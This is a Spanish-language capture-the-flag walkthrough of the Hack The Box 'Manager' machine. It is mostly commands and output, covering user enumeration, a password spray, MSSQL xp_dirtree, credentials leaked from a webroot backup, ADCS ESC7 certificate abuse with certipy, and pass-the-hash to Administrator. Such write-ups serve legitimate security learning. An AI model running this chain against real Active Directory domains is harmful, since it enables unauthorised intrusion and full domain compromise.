---
title: Manager
description: Manager
tags: [HTB]
---
## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -p- -vvv --min-rate 10000 10.129.34.52

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
5985/tcp  open  wsman
9389/tcp  open  adws
```

```bash
nmap -p 53,80,88,139,389,445,1433,3268,5985 -sCV 10.129.34.52`

`PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Manager
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: manager.htb)
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   DNS_Domain_Name: manager.htb
|   DNS_Computer_Name: dc01.manager.htb
|_  Product_Version: 10.0.17763
5985/tcp open  wsman
Service Info: Host: DC01; OS: Windows
```

```bash
echo "10.129.34.52 manager.htb dc01.manager.htb" | sudo tee -a /etc/hosts
```

### Enumeración SMB y RID Brute

```bash
nxc smb 10.129.34.52 -u 'anonymous' -p '' --shares

SMB  10.129.34.52  445  DC01  [+] manager.htb\anonymous: (Guest)
SMB  10.129.34.52  445  DC01  IPC$  READ
```

> SMB con sesión nula limitada. Se usa RID brute para enumerar usuarios del dominio:
> 

```bash
impacket-lookupsid anonymous@10.129.34.52 | grep "SidTypeUser" \
  | awk -F'\\' '{print $2}' | awk '{print $1}' \
  | grep -v -iE "guest|krbtgt|administrator|DC01" \
  | tr '[:upper:]' '[:lower:]' | tee users.txt

zhong
cheng
ryan
raven
jinwoo
chinhae
operator
```

### Password spray: usuario = contraseña

```bash
nxc smb 10.129.34.52 -u users.txt -p users.txt --no-bruteforce`

`SMB  [-] manager.htb\zhong:zhong   STATUS_LOGON_FAILURE
SMB  [-] manager.htb\raven:raven   STATUS_LOGON_FAILURE
SMB  [+] manager.htb\operator:operator

operator : operator
```

---

## 2. Vector de entrada — MSSQL xp_dirtree + Backup File Leak

### Paso 1 — Conectar a MSSQL con credenciales de operator

```bash
impacket-mssqlclient 'manager.htb/operator:operator@10.129.34.52'

[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
SQL (MANAGER\Operator  guest@master)>
```

> `operator` es `guest` en MSSQL — sin permisos para `xp_cmdshell`. Sin embargo, `xp_dirtree` sí está disponible y permite listar el filesystem del servidor.
> 

### Paso 2 — Listar el webroot con xp_dirtree

**`xp_dirtree`** es un procedimiento extendido de MSSQL que lista el contenido de un directorio del servidor. No requiere `sysadmin` — funciona con permisos de `guest` en muchas configuraciones por defecto.

```bash
EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;

subdirectory                      depth  file
-------------------------------   -----  ----
about.html                            1     1
contact.html                          1     1
index.html                            1     1
web.config                            1     1
website-backup-27-07-23-old.zip       1     1
```

### Paso 3 — Descargar el backup y extraer credenciales

```bash
wget http://10.129.34.52/website-backup-27-07-23-old.zip
unzip website-backup-27-07-23-old.zip
```

```bash
grep -r "password\|pass\|pwd\|user" . --include="*.xml" --include="*.config" -i
```

```bash
./.old-conf.xml:   <user>raven@manager.htb</user>
./.old-conf.xml:   <password>R4v3nBe5tD3veloP3r!123</password>

raven : R4v3nBe5tD3veloP3r!123
```

---

## 3. Acceso inicial

```bash
evil-winrm -i 10.129.34.52 -u raven -p 'R4v3nBe5tD3veloP3r!123'

Evil-WinRM shell v3.x
*Evil-WinRM* PS C:\Users\Raven\Desktop>
```

```bash
type C:\Users\Raven\Desktop\user.txt

[user flag]
```

---

## 4. Escalada de privilegios — ADCS ESC7

### Paso 1 — Identificar la vulnerabilidad con Certipy

```bash
certipy-ad find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \
  -dc-ip 10.129.34.52 -vulnerable -stdout`

CA Name          : manager-DC01-CA
Permissions:
  ManageCa       : MANAGER.HTB\Raven
  ManageCertificates: MANAGER.HTB\Administrators
  Enroll         : MANAGER.HTB\Raven

[!] Vulnerabilities
  ESC7: User has dangerous permissions.
```

> **ESC7** ocurre cuando un usuario tiene el permiso `ManageCA` sobre la CA. Esto permite añadirse a sí mismo como `Officer` (que tiene `ManageCertificates`), habilitar templates peligrosos como `SubCA`, emitir certificados para cualquier usuario — incluyendo Administrator — y autenticarse con ese certificado para obtener su hash NTLM.
> 

### Paso 2 — Añadir raven como Officer de la CA

```bash
certipy-ad ca \
  -ca 'manager-DC01-CA' \
  -add-officer raven \
  -u raven@manager.htb \
  -p 'R4v3nBe5tD3veloP3r!123' \
  -dc-ip 10.129.34.52
```

### Paso 3 — Habilitar el template SubCA

```bash
certipy-ad ca \
  -ca 'manager-DC01-CA' \
  -enable-template SubCA \
  -u raven@manager.htb \
  -p 'R4v3nBe5tD3veloP3r!123' \
  -dc-ip 10.129.34.52
```

### Paso 4 — Solicitar certificado como Administrator (genera el Request ID)

```bash
certipy-ad req \
  -ca 'manager-DC01-CA' \
  -template SubCA \
  -upn administrator@manager.htb \
  -u raven@manager.htb \
  -p 'R4v3nBe5tD3veloP3r!123' \
  -dc-ip 10.129.34.52

[*] Request ID is 20
[-] Got error while trying to request certificate: ...DENIED
[*] Request ID 20 saved
```

### Paso 5 — Aprobar el request como Officer

```bash
certipy-ad ca \
  -ca 'manager-DC01-CA' \
  -issue-request 20 \
  -u raven@manager.htb \
  -p 'R4v3nBe5tD3veloP3r!123' \
  -dc-ip 10.129.34.52
```

### Paso 6 — Recuperar el certificado emitido

```bash
certipy-ad req \
  -ca 'manager-DC01-CA' \
  -retrieve 20 \
  -u raven@manager.htb \
  -p 'R4v3nBe5tD3veloP3r!123' \
  -dc-ip 10.129.34.52

[*] Got certificate with UPN 'administrator@manager.htb'
[*] Saved certificate to 'administrator.pfx'
```

### Paso 7 — Autenticar con el certificado y obtener hash NTLM

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.34.52

[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*] Got TGT
[*] Got hash for 'administrator@manager.htb':
    aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

### Paso 8 — Pass-the-Hash como Administrator

```bash
evil-winrm -i 10.129.34.52 \
  -u administrator \
  -H 'ae5064c2f62317332c88629e025924ef'
```

- `Evil-WinRM* PS C:\Users\Administrator\Desktop>`

```bash
type C:\Users\Administrator\Desktop\root.txt

[root flag]
```

---

---

## 6. Lecciones aprendidas

- **`xp_dirtree` no requiere `sysadmin`.** Con permisos de `guest` en MSSQL es posible listar directorios del servidor. El webroot es el primer lugar a revisar — backups, configs y archivos olvidados aparecen frecuentemente.
- **Los archivos de backup en webroot son una filtración crítica.** `website-backup-27-07-23-old.zip` contenía `.old-conf.xml` con credenciales en texto claro. Siempre buscar ZIPs, TARs y archivos `.old`, `.bak`, `.conf` al listar directorios.
- **El password spray con usuario=contraseña es efectivo en entornos AD mal configurados.** `operator:operator` funcionó sin necesidad de fuerza bruta — siempre probar este patrón antes de listas de contraseñas grandes.
- **ESC7 convierte `ManageCA` en compromiso total del dominio.** Con ese único permiso se puede emitir certificados para cualquier cuenta, incluyendo Administrator, y autenticarse con PKINIT para obtener su hash sin tocar el DC directamente.
- **En máquinas similares buscar:** MSSQL accesible con credenciales débiles para `xp_dirtree`, archivos de backup en webroot accesibles via HTTP, permisos `ManageCA` o `ManageCertificates` sobre ADCS para ESC7/ESC8, password spray con usuario=contraseña en listas de usuarios AD enumerados via RID brute.
